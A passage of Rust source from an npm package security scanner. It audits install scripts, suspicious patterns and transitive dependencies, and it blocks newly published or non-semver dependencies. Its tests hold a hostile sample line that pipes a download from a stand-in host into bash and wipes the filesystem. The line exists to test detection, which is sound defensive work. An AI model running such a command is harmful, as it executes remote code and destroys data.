                        issue.issue_type.red(),
                        issue.file_path.bright_black(),
                        issue.line_number
                    );
                    println!("    {}", issue.description.yellow());
                    if let Some(snippet) = &issue.code_snippet {
                        println!("    Code: {}", snippet.bright_black());
                    }
                }

                if !full_report && critical_issues.len() > 5 {
                    println!(
                        "  {} {} more critical issues... (use --full-report to see all)",
                        "...".bright_black(),
                        critical_issues.len() - 5
                    );
                }
            }

            if !warning_issues.is_empty() {
                println!("\n{}", "⚠️  Code Warnings:".yellow().bold());

                let display_count = if full_report { warning_issues.len() } else { 5 };
                let issues_to_show = warning_issues.iter().take(display_count);

                for issue in issues_to_show {
                    println!(
                        "  {} {} ({}:{})",
                        "•".yellow(),
                        issue.issue_type.yellow(),
                        issue.file_path.bright_black(),
                        issue.line_number
                    );
                }

                if !full_report && warning_issues.len() > 5 {
                    println!(
                        "  {} {} more warnings... (use --full-report to see all)",
                        "...".bright_black(),
                        warning_issues.len() - 5
                    );
                }
            }

            // Show summary statistics
            let total_issues = audit.source_code_issues.len();
            let info_issues = audit
                .source_code_issues
                .iter()
                .filter(|i| i.severity == IssueSeverity::Info)
                .count();

            println!("\n{}", "📊 Issue Summary:".bright_cyan().bold());
            println!(
                "  {} {} critical",
                "🚨".red(),
                critical_issues.len().to_string().red().bold()
            );
            println!(
                "  {} {} warnings",
                "⚠️".yellow(),
                warning_issues.len().to_string().yellow()
            );
            if info_issues > 0 {
                println!(
                    "  {} {} info",
                    "ℹ️".bright_blue(),
                    info_issues.to_string().bright_blue()
                );
            }
            println!(
                "  {} {} total issues",
                "📝".bright_white(),
                total_issues.to_string().bright_white().bold()
            );
        }

        println!(
            "\n{}",
            "═══════════════════════════════════════════".bright_blue()
        );
    }

    pub fn ask_confirmation(&self, audit: &PackageAudit) -> Result<bool> {
        use inquire::Confirm;

        if audit.risk_level == RiskLevel::Safe {
            return Ok(true);
        }

        let message = match audit.risk_level {
            RiskLevel::Low => "This package has install scripts. Continue?",
            RiskLevel::Medium => "This package has SUSPICIOUS patterns. Are you sure?",
            RiskLevel::High => "This package has HIGH RISK patterns. Really continue?",
            RiskLevel::Critical => "⚠️  CRITICAL RISK DETECTED! Continue anyway?",
            _ => "Continue with installation?",
        };

        let default =
            audit.risk_level != RiskLevel::Critical && audit.risk_level != RiskLevel::High;

        Confirm::new(message)
            .with_default(default)
            .prompt()
            .map_err(|e| anyhow!(e))
    }

    /// Scan dependencies that are already installed in the current project
    pub fn scan_installed_dependencies(
        &self,
        include_dev_dependencies: bool,
        max_depth: usize,
    ) -> Result<TransitiveScanResult> {
        use indicatif::{ProgressBar, ProgressStyle};

        let package_json_path = Path::new("package.json");
        if !package_json_path.exists() {
            return Err(anyhow!(
                "No package.json found in the current directory to audit"
            ));
        }

        let node_modules_root = Path::new("node_modules");
        if !node_modules_root.exists() {
            return Err(anyhow!(
                "node_modules directory not found. Run 'fnpm install' before auditing installed packages"
            ));
        }

        let package_json: Value = serde_json::from_str(&fs::read_to_string(package_json_path)?)?;
        let mut root_dependencies: Vec<String> = package_json
            .get("dependencies")
            .and_then(|d| d.as_object())
            .map(|deps| deps.keys().cloned().collect())
            .unwrap_or_default();

        if include_dev_dependencies {
            if let Some(dev_deps) = package_json
                .get("devDependencies")
                .and_then(|d| d.as_object())
            {
                root_dependencies.extend(dev_deps.keys().cloned());
            }
        }

        if root_dependencies.is_empty() {
            return Err(anyhow!("No dependencies found to audit"));
        }

        println!("{}", "🔍 Auditing installed dependencies...".cyan().bold());
        println!(
            "   {} {}",
            "Max depth:".bright_black(),
            max_depth.to_string().bright_white()
        );

        let pb = ProgressBar::new_spinner();
        pb.set_style(
            ProgressStyle::default_spinner()
                .template("{spinner:.cyan} {msg}")
                .unwrap()
                .tick_chars("⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"),
        );

        let mut result = TransitiveScanResult {
            total_packages: 0,
            scanned_packages: 0,
            high_risk_count: 0,
            medium_risk_count: 0,
            packages_with_scripts: 0,
            max_depth_reached: 0,
            package_audits: HashMap::new(),
        };

        let mut visited = HashSet::new();
        let mut to_scan: Vec<(String, usize, PathBuf)> = root_dependencies
            .into_iter()
            .map(|dep| (dep, 0, node_modules_root.to_path_buf()))
            .collect();

        while let Some((current_package, depth, parent_dir)) = to_scan.pop() {
            if visited.contains(&current_package) {
                continue;
            }
            visited.insert(current_package.clone());

            result.total_packages += 1;
            result.max_depth_reached = result.max_depth_reached.max(depth);

            let indent = "  ".repeat(depth);
            let arrow = if depth == 0 { "📦" } else { "↳" };
            pb.set_message(format!(
                "{}{} Scanning installed: {}",
                indent,
                arrow,
                current_package.bright_white()
            ));
            pb.tick();

            let package_path = match self.resolve_installed_package_path(
                node_modules_root,
                Some(&parent_dir),
                &current_package,
            ) {
                Some(path) => path,
                None => {
                    pb.println(format!(
                        "   {} {}",
                        "⚠".yellow(),
                        format!(
                            "Package {} not found in node_modules (skipping)",
                            current_package
                        )
                        .bright_black()
                    ));
                    continue;
                }
            };

            match self.audit_installed_package(&current_package, &package_path) {
                Ok(audit) => {
                    result.scanned_packages += 1;

                    if audit.has_scripts {
                        result.packages_with_scripts += 1;
                    }

                    match audit.risk_level {
                        RiskLevel::High | RiskLevel::Critical => result.high_risk_count += 1,
                        RiskLevel::Medium => result.medium_risk_count += 1,
                        _ => {}
                    }

                    if depth < max_depth {
                        for dep in &audit.dependencies {
                            to_scan.push((dep.clone(), depth + 1, package_path.clone()));
                        }
                    }

                    result.package_audits.insert(current_package.clone(), audit);
                }
                Err(e) => {
                    pb.println(format!(
                        "   {} Failed to scan {}: {}",
                        "⚠".yellow(),
                        current_package.bright_black(),
                        e.to_string().bright_black()
                    ));
                }
            }
        }

        pb.finish_and_clear();

        Ok(result)
    }

    /// Scan transitive dependencies with depth limit
    pub fn scan_transitive_dependencies(
        &self,
        package: &str,
        max_depth: usize,
    ) -> Result<TransitiveScanResult> {
        use indicatif::{ProgressBar, ProgressStyle};

        println!("{}", "🔍 Scanning transitive dependencies...".cyan().bold());
        println!(
            "   {} {}",
            "Max depth:".bright_black(),
            max_depth.to_string().bright_white()
        );

        let mut result = TransitiveScanResult {
            total_packages: 0,
            scanned_packages: 0,
            high_risk_count: 0,
            medium_risk_count: 0,
            packages_with_scripts: 0,
            max_depth_reached: 0,
            package_audits: HashMap::new(),
        };

        let mut visited = HashSet::new();
        let mut to_scan = vec![(package.to_string(), 0)];

        // Create progress bar
        let pb = ProgressBar::new_spinner();
        pb.set_style(
            ProgressStyle::default_spinner()
                .template("{spinner:.cyan} {msg}")
                .unwrap()
                .tick_chars("⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"),
        );

        while let Some((current_package, depth)) = to_scan.pop() {
            if depth > max_depth {
                result.max_depth_reached = result.max_depth_reached.max(depth - 1);
                continue;
            }

            result.max_depth_reached = result.max_depth_reached.max(depth);

            // Skip if already visited
            if visited.contains(&current_package) {
                continue;
            }

            visited.insert(current_package.clone());
            result.total_packages += 1;

            // Update progress bar
            let indent = "  ".repeat(depth);
            let arrow = if depth == 0 { "📦" } else { "↳" };
            pb.set_message(format!(
                "{}{} Scanning: {}",
                indent,
                arrow,
                current_package.bright_white()
            ));
            pb.tick();

            // Audit the package
            match self.audit_package_quiet(&current_package) {
                Ok(audit) => {
                    result.scanned_packages += 1;

                    // Update statistics
                    if audit.has_scripts {
                        result.packages_with_scripts += 1;
                    }

                    match audit.risk_level {
                        RiskLevel::High | RiskLevel::Critical => result.high_risk_count += 1,
                        RiskLevel::Medium => result.medium_risk_count += 1,
                        _ => {}
                    }

                    // Queue dependencies for scanning
                    if depth < max_depth {
                        for dep in &audit.dependencies {
                            to_scan.push((dep.clone(), depth + 1));
                        }
                    }

                    result.package_audits.insert(current_package.clone(), audit);
                }
                Err(e) => {
                    pb.println(format!(
                        "   {} Failed to scan {}: {}",
                        "⚠".yellow(),
                        current_package.bright_black(),
                        e.to_string().bright_black()
                    ));
                }
            }
        }

        pb.finish_and_clear();

        Ok(result)
    }

    /// Audit a package without verbose output (for batch scanning)
    fn audit_package_quiet(&self, package: &str) -> Result<PackageAudit> {
        // Install package in temp directory with --ignore-scripts (silently)
        self.install_in_sandbox_quiet(package)?;

        // Find and analyze the package.json
        let package_json_path = self.find_package_json(package)?;

        let mut audit = self.analyze_package_json(&package_json_path, package)?;

        // Scan source code (limited for performance)
        if let Some(package_dir) = package_json_path.parent() {
            self.scan_source_code(package_dir, &mut audit);
        }

        // Recalculate risk level
        self.calculate_and_assign_risk(&mut audit);

        Ok(audit)
    }

    /// Display transitive scan summary
    pub fn display_transitive_summary(&self, result: &TransitiveScanResult) {
        self.display_transitive_summary_impl(result)
    }

    pub fn display_transitive_summary_with_options(
        &self,
        result: &TransitiveScanResult,
        _full_report: bool, // Mantenido para compatibilidad pero siempre muestra todo
    ) {
        self.display_transitive_summary_impl(result)
    }

    fn display_transitive_summary_impl(&self, result: &TransitiveScanResult) {
        println!(
            "\n{}",
            "═══════════════════════════════════════════".bright_blue()
        );
        println!(
            "{}",
            "📊 TRANSITIVE DEPENDENCY SCAN SUMMARY".bright_cyan().bold()
        );
        println!(
            "{}",
            "═══════════════════════════════════════════".bright_blue()
        );

        println!(
            "\n{} {}",
            "Total packages found:".bright_white(),
            result.total_packages.to_string().bright_white().bold()
        );
        println!(
            "{} {}",
            "Successfully scanned:".bright_white(),
            result.scanned_packages.to_string().green().bold()
        );
        println!(
            "{} {}",
            "Maximum depth reached:".bright_white(),
            result.max_depth_reached.to_string().bright_white()
        );

        println!("\n{}", "Security Summary:".yellow().bold());
        println!(
            "  {} {}",
            "Packages with install scripts:".bright_white(),
            result.packages_with_scripts.to_string().yellow()
        );
        println!(
            "  {} {}",
            "High/Critical risk packages:".bright_white(),
            if result.high_risk_count > 0 {
                result.high_risk_count.to_string().red().bold()
            } else {
                result.high_risk_count.to_string().green()
            }
        );
        println!(
            "  {} {}",
            "Medium risk packages:".bright_white(),
            if result.medium_risk_count > 0 {
                result.medium_risk_count.to_string().yellow()
            } else {
                result.medium_risk_count.to_string().green()
            }
        );

        // Show high-risk packages
        if result.high_risk_count > 0 || result.medium_risk_count > 0 {
            if result.high_risk_count > 0 {
                println!("\n{}", "⚠️  HIGH RISK PACKAGES:".red().bold());

                let high_risk_packages: Vec<_> = result
                    .package_audits
                    .iter()
                    .filter(|(_, audit)| {
                        audit.risk_level == RiskLevel::High
                            || audit.risk_level == RiskLevel::Critical
                    })
                    .collect();

                for (pkg_name, audit) in high_risk_packages.iter() {
                    println!(
                        "  {} {} - {}",
                        "•".red(),
                        pkg_name.bright_white(),
                        audit.risk_level.color()
                    );

                    // Show all suspicious patterns
                    if !audit.suspicious_patterns.is_empty() {
                        for pattern in &audit.suspicious_patterns {
                            println!("    {} {}", "→".bright_black(), pattern.bright_black());
                        }
                    }

                    // Show all critical source code issues
                    let critical_issues: Vec<_> = audit
                        .source_code_issues
                        .iter()
                        .filter(|i| i.severity == IssueSeverity::Critical)
                        .collect();

                    if !critical_issues.is_empty() {
                        for issue in critical_issues.iter() {
                            println!(
                                "    {} {} ({}:{})",
                                "→".red(),
                                issue.issue_type.red(),
                                issue.file_path.bright_black(),
                                issue.line_number
                            );
                            println!("      {}", issue.description.bright_black());
                        }
                    }

                    // Show all warnings
                    let warning_issues: Vec<_> = audit
                        .source_code_issues
                        .iter()
                        .filter(|i| i.severity == IssueSeverity::Warning)
                        .collect();

                    if !warning_issues.is_empty() {
                        for issue in warning_issues.iter() {
                            println!(
                                "    {} {} ({}:{})",
                                "→".yellow(),
                                issue.issue_type.yellow(),
                                issue.file_path.bright_black(),
                                issue.line_number
                            );
                        }
                    }
                }
            }

            // Show medium-risk packages
            if result.medium_risk_count > 0 {
                println!("\n{}", "⚠️  MEDIUM RISK PACKAGES:".yellow().bold());

                let medium_risk_packages: Vec<_> = result
                    .package_audits
                    .iter()
                    .filter(|(_, audit)| audit.risk_level == RiskLevel::Medium)
                    .collect();

                for (pkg_name, audit) in medium_risk_packages.iter() {
                    println!(
                        "  {} {} - {}",
                        "•".yellow(),
                        pkg_name.bright_white(),
                        audit.risk_level.color()
                    );

                    // Show all suspicious patterns
                    if !audit.suspicious_patterns.is_empty() {
                        for pattern in &audit.suspicious_patterns {
                            println!("    {} {}", "→".bright_black(), pattern.bright_black());
                        }
                    }

                    // Show all issues
                    for issue in &audit.source_code_issues {
                        let (marker, color) = match issue.severity {
                            IssueSeverity::Critical => ("→", "red"),
                            IssueSeverity::Warning => ("→", "yellow"),
                            IssueSeverity::Info => ("→", "blue"),
                        };

                        println!(
                            "    {} {} ({}:{})",
                            marker.bright_black(),
                            match color {
                                "red" => issue.issue_type.red(),
                                "yellow" => issue.issue_type.yellow(),
                                _ => issue.issue_type.bright_blue(),
                            },
                            issue.file_path.bright_black(),
                            issue.line_number
                        );
                    }
                }
            }
        }

        // Show packages with LOW risk but with issues
        let low_risk_with_issues: Vec<_> = result
            .package_audits
            .iter()
            .filter(|(_, audit)| {
                audit.risk_level == RiskLevel::Low
                    && (!audit.source_code_issues.is_empty()
                        || !audit.suspicious_patterns.is_empty())
            })
            .collect();

        if !low_risk_with_issues.is_empty() {
            println!(
                "\n{}",
                "ℹ️  LOW RISK PACKAGES WITH ISSUES:".bright_blue().bold()
            );

            for (pkg_name, audit) in low_risk_with_issues.iter() {
                println!("  {} {}", "•".bright_blue(), pkg_name.bright_white());

                // Show all issues
                for issue in &audit.source_code_issues {
                    println!(
                        "    {} {} ({}:{})",
                        "→".bright_black(),
                        issue.issue_type.bright_black(),
                        issue.file_path.bright_black(),
                        issue.line_number
                    );
                }

                if !audit.suspicious_patterns.is_empty() {
                    for pattern in &audit.suspicious_patterns {
                        println!("    {} {}", "→".bright_black(), pattern.bright_black());
                    }
                }
            }
        }

        // Show summary of total issues
        let total_issues: usize = result
            .package_audits
            .values()
            .map(|audit| audit.source_code_issues.len() + audit.suspicious_patterns.len())
            .sum();

        if total_issues > 0 {
            println!(
                "\n{} Found {} total security issues across all packages.",
                "📊".bright_cyan(),
                total_issues.to_string().bright_white().bold()
            );
        }

        println!(
            "\n{}",
            "═══════════════════════════════════════════".bright_blue()
        );
    }

    /// Display main package details from transitive scan result
    pub fn display_main_package_from_transitive(
        &self,
        result: &TransitiveScanResult,
        main_package: &str,
        _full_report: bool, // Always shows all - kept for compatibility
    ) {
        if let Some(audit) = result.package_audits.get(main_package) {
            println!(
                "\n{}",
                "═══════════════════════════════════════════".bright_blue()
            );
            println!("{}", "📦 MAIN PACKAGE ANALYSIS".bright_cyan().bold());
            println!(
                "{}",
                "═══════════════════════════════════════════".bright_blue()
            );

            println!(
                "\n{} {}",
                "Package:".bright_white().bold(),
                main_package.bright_white()
            );
            println!(
                "{} {}",
                "Risk Level:".bright_white().bold(),
                audit.risk_level.color()
            );

            // Show scripts if present
            if audit.has_scripts {
                println!("\n{}", "📜 Install Scripts:".yellow().bold());
                if let Some(script) = &audit.preinstall {
                    println!("  {} {}", "preinstall:".red().bold(), script.bright_white());
                }
                if let Some(script) = &audit.install {
                    println!("  {} {}", "install:".red().bold(), script.bright_white());
                }
                if let Some(script) = &audit.postinstall {
                    println!(
                        "  {} {}",
                        "postinstall:".red().bold(),
                        script.bright_white()
                    );
                }
            }

            // Show ALL suspicious patterns
            if !audit.suspicious_patterns.is_empty() {
                println!("\n{}", "⚠️  Suspicious Patterns:".red().bold());
                for pattern in &audit.suspicious_patterns {
                    println!("  {} {}", "•".red(), pattern.yellow());
                }
            }

            // Show source code issues
            if !audit.source_code_issues.is_empty() {
                let critical_issues: Vec<_> = audit
                    .source_code_issues
                    .iter()
                    .filter(|i| i.severity == IssueSeverity::Critical)
                    .collect();

                let warning_issues: Vec<_> = audit
                    .source_code_issues
                    .iter()
                    .filter(|i| i.severity == IssueSeverity::Warning)
                    .collect();

                if !critical_issues.is_empty() {
                    println!("\n{}", "🚨 Critical Issues:".red().bold());
                    for issue in critical_issues.iter() {
                        println!(
                            "  {} {} ({}:{})",
                            "⚠".red().bold(),
                            issue.issue_type.red(),
                            issue.file_path.bright_black(),
                            issue.line_number
                        );
                        println!("    {}", issue.description.yellow());
                    }
                }

                if !warning_issues.is_empty() {
                    println!("\n{}", "⚠️  Warnings:".yellow().bold());
                    for issue in warning_issues.iter() {
                        println!(
                            "  {} {} ({}:{})",
                            "•".yellow(),
                            issue.issue_type.yellow(),
                            issue.file_path.bright_black(),
                            issue.line_number
                        );
                        println!("    {}", issue.description.bright_black());
                    }
                }

                // Show info issues too
                let info_issues: Vec<_> = audit
                    .source_code_issues
                    .iter()
                    .filter(|i| i.severity == IssueSeverity::Info)
                    .collect();

                if !info_issues.is_empty() {
                    println!("\n{}", "ℹ️  Info:".bright_blue().bold());
                    for issue in info_issues.iter() {
                        println!(
                            "  {} {} ({}:{})",
                            "•".bright_blue(),
                            issue.issue_type.bright_blue(),
                            issue.file_path.bright_black(),
                            issue.line_number
                        );
                    }
                }
            } else if !audit.has_scripts && audit.suspicious_patterns.is_empty() {
                println!(
                    "\n{}",
                    "✓ No security issues detected in main package".green()
                );
            }

            println!(
                "\n{}",
                "═══════════════════════════════════════════".bright_blue()
            );
        }
    }

    /// Export detailed audit report to JSON file
    pub fn export_audit_to_json(&self, audit: &PackageAudit, filename: &str) -> Result<()> {
        use std::fs;
        let json = serde_json::to_string_pretty(audit)?;
        fs::write(filename, json)?;
        println!(
            "{} Detailed report exported to: {}",
            "✅".green(),
            filename.bright_white()
        );
        Ok(())
    }

    /// Export transitive scan results to JSON file
    pub fn export_transitive_to_json(
        &self,
        result: &TransitiveScanResult,
        filename: &str,
    ) -> Result<()> {
        use std::fs;
        let json = serde_json::to_string_pretty(result)?;
        fs::write(filename, json)?;
        println!(
            "{} Detailed transitive scan report exported to: {}",
            "✅".green(),
            filename.bright_white()
        );
        Ok(())
    }

    /// Export transitive scan results to Markdown file (human-friendly)
    pub fn export_transitive_to_markdown(
        &self,
        result: &TransitiveScanResult,
        filename: &str,
    ) -> Result<()> {
        let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
        let mut report = String::new();

        writeln!(report, "# FNPM Security Scan Report")?;
        writeln!(report)?;
        writeln!(report, "- Generated: {}", timestamp)?;
        writeln!(report, "- Total packages found: {}", result.total_packages)?;
        writeln!(
            report,
            "- Successfully scanned: {}",
            result.scanned_packages
        )?;
        writeln!(report, "- Max depth reached: {}", result.max_depth_reached)?;
        writeln!(
            report,
            "- Packages with install scripts: {}",
            result.packages_with_scripts
        )?;
        writeln!(
            report,
            "- High/Critical risk packages: {}",
            result.high_risk_count
        )?;
        writeln!(
            report,
            "- Medium risk packages: {}",
            result.medium_risk_count
        )?;

        writeln!(report, "\n## Summary")?;
        writeln!(
            report,
            "- High/Critical risk packages: {}",
            result.high_risk_count
        )?;
        writeln!(
            report,
            "- Medium risk packages: {}",
            result.medium_risk_count
        )?;
        writeln!(
            report,
            "- Packages with install scripts: {}",
            result.packages_with_scripts
        )?;

        // Helper to get risk label without colors
        let risk_label = |risk: &RiskLevel| match risk {
            RiskLevel::Safe => "Safe",
            RiskLevel::Low => "Low",
            RiskLevel::Medium => "Medium",
            RiskLevel::High => "High",
            RiskLevel::Critical => "Critical",
        };

        // High/Critical section
        let mut high_risk_packages: Vec<_> = result
            .package_audits
            .iter()
            .filter(|(_, audit)| {
                audit.risk_level == RiskLevel::High || audit.risk_level == RiskLevel::Critical
            })
            .collect();
        high_risk_packages.sort_by_key(|(name, _)| *name);

        if !high_risk_packages.is_empty() {
            writeln!(report, "\n## High & Critical Risk Packages")?;
            for (pkg_name, audit) in high_risk_packages {
                writeln!(
                    report,
                    "\n### {} (Risk: {})",
                    pkg_name,
                    risk_label(&audit.risk_level)
                )?;

                if audit.has_scripts {
                    writeln!(report, "- Install scripts: yes")?;
                }
                if !audit.suspicious_patterns.is_empty() {
                    writeln!(report, "- Suspicious patterns:")?;
                    for pattern in &audit.suspicious_patterns {
                        writeln!(report, "  - {}", pattern)?;
                    }
                }

                if !audit.source_code_issues.is_empty() {
                    writeln!(report, "- Code issues:")?;
                    for issue in &audit.source_code_issues {
                        writeln!(
                            report,
                            "  - [{}] {} ({}:{}) - {}",
                            match issue.severity {
                                IssueSeverity::Critical => "Critical",
                                IssueSeverity::Warning => "Warning",
                                IssueSeverity::Info => "Info",
                            },
                            issue.issue_type,
                            issue.file_path,
                            issue.line_number,
                            issue.description
                        )?;
                    }
                }
            }
        }

        // Medium section
        let mut medium_risk_packages: Vec<_> = result
            .package_audits
            .iter()
            .filter(|(_, audit)| audit.risk_level == RiskLevel::Medium)
            .collect();
        medium_risk_packages.sort_by_key(|(name, _)| *name);

        if !medium_risk_packages.is_empty() {
            writeln!(report, "\n## Medium Risk Packages")?;
            for (pkg_name, audit) in medium_risk_packages {
                writeln!(
                    report,
                    "\n### {} (Risk: {})",
                    pkg_name,
                    risk_label(&audit.risk_level)
                )?;

                if audit.has_scripts {
                    writeln!(report, "- Install scripts: yes")?;
                }
                if !audit.suspicious_patterns.is_empty() {
                    writeln!(report, "- Suspicious patterns:")?;
                    for pattern in &audit.suspicious_patterns {
                        writeln!(report, "  - {}", pattern)?;
                    }
                }

                if !audit.source_code_issues.is_empty() {
                    writeln!(report, "- Code issues:")?;
                    for issue in &audit.source_code_issues {
                        writeln!(
                            report,
                            "  - [{}] {} ({}:{})",
                            match issue.severity {
                                IssueSeverity::Critical => "Critical",
                                IssueSeverity::Warning => "Warning",
                                IssueSeverity::Info => "Info",
                            },
                            issue.issue_type,
                            issue.file_path,
                            issue.line_number
                        )?;
                    }
                }
            }
        }

        // Low risk but with issues
        let mut low_risk_with_issues: Vec<_> = result
            .package_audits
            .iter()
            .filter(|(_, audit)| {
                audit.risk_level == RiskLevel::Low
                    && (!audit.source_code_issues.is_empty()
                        || !audit.suspicious_patterns.is_empty())
            })
            .collect();
        low_risk_with_issues.sort_by_key(|(name, _)| *name);

        if !low_risk_with_issues.is_empty() {
            writeln!(report, "\n## Low Risk Packages With Findings")?;
            for (pkg_name, audit) in low_risk_with_issues {
                writeln!(report, "\n### {} (Risk: Low)", pkg_name)?;

                if !audit.suspicious_patterns.is_empty() {
                    writeln!(report, "- Suspicious patterns:")?;
                    for pattern in &audit.suspicious_patterns {
                        writeln!(report, "  - {}", pattern)?;
                    }
                }

                if !audit.source_code_issues.is_empty() {
                    writeln!(report, "- Code issues:")?;
                    for issue in &audit.source_code_issues {
                        writeln!(
                            report,
                            "  - [{}] {} ({}:{})",
                            match issue.severity {
                                IssueSeverity::Critical => "Critical",
                                IssueSeverity::Warning => "Warning",
                                IssueSeverity::Info => "Info",
                            },
                            issue.issue_type,
                            issue.file_path,
                            issue.line_number
                        )?;
                    }
                }
            }
        }

        fs::write(filename, report)?;
        println!(
            "{} Detailed transitive scan report exported to: {}",
            "✅".green(),
            filename.bright_white()
        );
        Ok(())
    }
}

impl Drop for SecurityScanner {
    fn drop(&mut self) {
        // Cleanup temp directory
        let _ = fs::remove_dir_all(&self.temp_dir);
    }
}

// ---------------------------------------------------------------------------
// Supply-chain protections (inspired by pnpm v11):
//   - minimum_release_age: refuse versions that hit the registry too recently
//   - block_exotic_subdeps: refuse non-semver specifiers (git/url/file/etc.)
// ---------------------------------------------------------------------------

#[derive(Debug)]
pub struct ReleaseAgeViolation {
    pub package: String,
    pub version: String,
    pub age_minutes: u64,
    pub required_minutes: u64,
}

/// Query the npm registry for `package` and verify its resolved version is older
/// than `min_age_minutes`. Returns `Ok(None)` if the version is old enough, or
/// `Ok(Some(violation))` if it is too new. Network or parse failures degrade
/// to `Ok(None)` — fail-open is intentional so offline installs still work, but
/// the warning helper notifies the user.
pub fn check_release_age(
    package: &str,
    version_spec: &str,
    min_age_minutes: u64,
) -> Result<Option<ReleaseAgeViolation>> {
    if min_age_minutes == 0 {
        return Ok(None);
    }

    let url = format!("https://registry.npmjs.org/{}", package);
    let resp = match reqwest::blocking::Client::new()
        .get(&url)
        .timeout(std::time::Duration::from_secs(5))
        .send()
    {
        Ok(r) => r,
        Err(_) => return Ok(None),
    };

    if !resp.status().is_success() {
        return Ok(None);
    }

    let body: Value = match resp.json() {
        Ok(v) => v,
        Err(_) => return Ok(None),
    };

    // Resolve `version_spec` against `dist-tags` (e.g. "latest") if not a concrete version.
    let resolved = body
        .get("dist-tags")
        .and_then(|t| t.get(version_spec))
        .and_then(|v| v.as_str())
        .unwrap_or(version_spec)
        .to_string();

    let published = match body
        .get("time")
        .and_then(|t| t.get(&resolved))
        .and_then(|v| v.as_str())
    {
        Some(s) => s.to_string(),
        None => return Ok(None),
    };

    let published_ts = match chrono::DateTime::parse_from_rfc3339(&published) {
        Ok(t) => t,
        Err(_) => return Ok(None),
    };
    let now = chrono::Utc::now();
    let age_minutes = (now.timestamp() - published_ts.timestamp()).max(0) as u64 / 60;

    if age_minutes < min_age_minutes {
        Ok(Some(ReleaseAgeViolation {
            package: package.to_string(),
            version: resolved,
            age_minutes,
            required_minutes: min_age_minutes,
        }))
    } else {
        Ok(None)
    }
}

#[derive(Debug)]
pub struct ExoticDepViolation {
    pub package: String,
    pub specifier: String,
}

/// Scan a `package.json` at `path` for dependencies whose specifier is not a
/// normal semver/dist-tag range. Returns violations; empty = clean.
pub fn check_exotic_subdeps(package_json_path: &Path) -> Result<Vec<ExoticDepViolation>> {
    let content = match fs::read_to_string(package_json_path) {
        Ok(c) => c,
        Err(_) => return Ok(Vec::new()),
    };
    let json: Value = serde_json::from_str(&content)?;

    let mut violations = Vec::new();
    for field in ["dependencies", "devDependencies", "optionalDependencies"] {
        if let Some(deps) = json.get(field).and_then(|v| v.as_object()) {
            for (name, spec_val) in deps {
                if let Some(spec) = spec_val.as_str() {
                    if is_exotic_specifier(spec) {
                        violations.push(ExoticDepViolation {
                            package: name.clone(),
                            specifier: spec.to_string(),
                        });
                    }
                }
            }
        }
    }
    Ok(violations)
}

fn is_exotic_specifier(spec: &str) -> bool {
    let s = spec.trim();
    if s.is_empty() {
        return false;
    }
    let exotic_prefixes = [
        "git+",
        "git:",
        "git@",
        "ssh://",
        "http://",
        "https://",
        "file:",
        "link:",
        "github:",
        "bitbucket:",
        "gitlab:",
        "gist:",
    ];
    if exotic_prefixes.iter().any(|p| s.starts_with(p)) {
        return true;
    }
    // `user/repo` shorthand for GitHub
    if !s.starts_with('@') && s.contains('/') && !s.starts_with("./") && !s.starts_with("../") {
        // Distinguish from scoped versions like "1.2.3" — those don't contain '/'.
        return true;
    }
    false
}

/// Print an upfront banner explaining the supply-chain protections that are active.
pub fn print_protections_banner(min_age_minutes: u64, block_exotic: bool, allow_builds: &[String]) {
    eprintln!("{} supply-chain protections active:", "fnpm:".cyan().bold());
    if min_age_minutes > 0 {
        eprintln!(
            "  • {} versions younger than {} min are blocked",
            "minimum_release_age".bright_white(),
            min_age_minutes
        );
    }
    if block_exotic {
        eprintln!(
            "  • {} (git/url/file/github specifiers rejected)",
            "block_exotic_subdeps".bright_white()
        );
    }
    if allow_builds.is_empty() {
        eprintln!(
            "  • {} = [] — all lifecycle scripts blocked",
            "allow_builds".bright_white()
        );
    } else {
        eprintln!("  • {} = {:?}", "allow_builds".bright_white(), allow_builds);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn scanner() -> SecurityScanner {
        SecurityScanner::new("npm".to_string()).expect("failed to create scanner")
    }

    fn empty_audit(name: &str) -> PackageAudit {
        PackageAudit {
            package_name: name.to_string(),
            has_scripts: false,
            preinstall: None,
            install: None,
            postinstall: None,
            suspicious_patterns: Vec::new(),
            source_code_issues: Vec::new(),
            risk_level: RiskLevel::Safe,
            dependencies: Vec::new(),
            dev_dependencies: Vec::new(),
            behavioral_chains: Vec::new(),
            risk_score: 0,
        }
    }

    fn issue(severity: IssueSeverity) -> SourceCodeIssue {
        SourceCodeIssue {
            file_path: "index.js".to_string(),
            line_number: 1,
            issue_type: "Command execution".to_string(),
            description: "exec call".to_string(),
            severity,
            code_snippet: Some("exec('ls')".to_string()),
        }
    }

    fn chain(risk_score: u32) -> BehavioralChain {
        BehavioralChain {
            chain_type: AttackChainType::DataExfiltration,
            description: "test chain".to_string(),
            evidence: vec!["evidence".to_string()],
            severity: IssueSeverity::Critical,
            risk_score,
        }
    }

    fn sample_transitive_result() -> TransitiveScanResult {
        let mut audits = HashMap::new();

        let mut high = empty_audit("bad-pkg");
        high.risk_level = RiskLevel::High;
        high.has_scripts = true;
        high.suspicious_patterns
            .push("curl: Downloads files from internet".to_string());
        high.source_code_issues.push(issue(IssueSeverity::Critical));
        audits.insert("bad-pkg".to_string(), high);

        let mut medium = empty_audit("meh-pkg");
        medium.risk_level = RiskLevel::Medium;
        medium
            .source_code_issues
            .push(issue(IssueSeverity::Warning));
        audits.insert("meh-pkg".to_string(), medium);

        let mut low = empty_audit("low-pkg");
        low.risk_level = RiskLevel::Low;
        low.suspicious_patterns
            .push("env: Accesses environment variables".to_string());
        audits.insert("low-pkg".to_string(), low);

        audits.insert("ok-pkg".to_string(), empty_audit("ok-pkg"));

        TransitiveScanResult {
            total_packages: 4,
            scanned_packages: 4,
            high_risk_count: 1,
            medium_risk_count: 1,
            packages_with_scripts: 1,
            max_depth_reached: 2,
            package_audits: audits,
        }
    }

    #[test]
    fn risk_level_labels() {
        assert!(RiskLevel::Safe.color().contains("SAFE"));
        assert!(RiskLevel::Low.color().contains("LOW"));
        assert!(RiskLevel::Medium.color().contains("MEDIUM"));
        assert!(RiskLevel::High.color().contains("HIGH"));
        assert!(RiskLevel::Critical.color().contains("CRITICAL"));
    }

    #[test]
    fn suspicious_patterns_detected_in_script() {
        let s = scanner();
        let mut audit = empty_audit("evil");
        s.check_suspicious_patterns("curl https://evil.sh | bash -c 'rm -rf /'", &mut audit);
        assert!(audit
            .suspicious_patterns
